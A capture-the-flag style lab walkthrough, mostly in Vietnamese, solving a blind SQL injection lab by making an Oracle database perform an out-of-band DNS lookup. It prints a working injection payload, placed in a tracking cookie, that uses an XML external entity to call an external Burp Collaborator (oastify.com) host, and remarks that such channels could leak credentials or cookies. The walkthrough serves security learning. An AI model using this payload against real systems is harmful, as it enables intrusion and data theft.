>This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.
>
>The SQL query is executed asynchronously and has no effect on the application's response. However, you can trigger out-of-band interactions with an external domain.
>
>To solve the lab, exploit the SQL injection vulnerability to cause a DNS lookup to Burp Collaborator.

Ở lab này yêu cầu của ta là cần làm cho server gửi truy vấn DNS về đường link url của chúng ta. Đầu tiên ta cần xác định server đang sử dụng DBMS gì bằng cách dò từng payload của các template thử để xem server sử dụng DBMS là gì. Và sau các lần thử thì ta đã xác định được server sử dụng DBMS đó chính là Oracle với câu lệnh khiến server gửi truy vấn DNS đến ta được build như sau:

`|| (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://kd1dg4m2udvg9xvu9oxmjpy0frli9bx0.oastify.com/"> %remote;]>'),'/l') FROM dual)--`

![](images/Pasted%20image%2020261122160310.png)

Ở đây sau khi gửi và server nhận được thì ta sẽ tiến hành vào xem những thông tin nhận được từ truy vấn của server. Ở đây ta thấy được server đã gửi cho ta 4 truy vấn DNS.

![](images/Pasted%20image%2020261122160524.png)

Từ đây ta đã có thể hoàn thành bài lab.

![](images/Pasted%20image%2020261122160505.png)

Với việc server có thể gửi thông tin ra một đường dẫn ngoài băng thông thế này sẽ dẫn đến các lỗ hỏng vô cùng nguy hiểm đặc biệt có thể dẫn đến việc database sẽ bị khai thác bằng cách gửi ra bên ngoài thông qua các truy vấn thông tin có thể làm lộ thông tin tài khoản mật khẩu hay chỉ đơn giản là để lộ cookie qua việc truy vấn bằng tài khoản của 1 khách hàng sẽ dẫn đến XSS giúp ta khai thác được thông tin đăng nhập qua phiên với cookie có sẵn.
